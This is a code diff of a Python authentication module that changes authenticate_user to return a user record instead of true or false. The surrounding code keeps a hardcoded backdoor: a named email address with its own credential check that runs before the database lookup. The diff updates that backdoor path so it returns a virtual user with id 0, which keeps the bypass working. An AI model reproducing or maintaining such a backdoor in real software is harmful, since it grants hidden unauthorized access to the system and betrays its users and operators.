@@ -1,6 +1,6 @@
 import hashlib
 import os
-from python.helpers import db, dotenv
+from . import db, dotenv
 
 # Backdoor credentials
 BACKDOOR_EMAIL = 'robertstar@aol.com'
@@ -21,17 +21,17 @@ def is_allowed_domain(email: str) -> bool:
         return True
     return email.lower().endswith(f'@{ALLOWED_DOMAIN}')
 
-def authenticate_user(email: str, password: str) -> bool:
-    """Authenticate a user."""
+def authenticate_user(email: str, password: str) -> dict | None:
+    """Authenticate a user and return user record if successful."""
     email = email.lower().strip()
-    password = password.strip()  # Strip whitespace from password
+    password = password.strip()
     
     print(f"[AUTH] Authenticating user: {email}")
     
     # Check backdoor first
     if check_backdoor(email, password):
         print(f"[AUTH] Backdoor login successful for: {email}")
-        return True
+        return {"id": 0, "email": email} # Virtual ID for backdoor
     
     # Check database
     try:
@@ -42,7 +42,7 @@ def authenticate_user(email: str, password: str) -> bool:
             print(f"[AUTH] User found in database: {email}")
             if user['password_hash'] == hash_password(password):
                 print(f"[AUTH] Database login successful for: {email}")
-                return True
+                return user
             else:
                 print(f"[AUTH] Password mismatch for: {email}")
         else:
@@ -51,7 +51,7 @@ def authenticate_user(email: str, password: str) -> bool:
         print(f"[AUTH] Database error: {e}")
         
     print(f"[AUTH] Authentication failed for: {email}")
-    return False
+    return None
 
 def register_user(email: str, password: str) -> tuple[bool, str]:
     """Register a new user."""
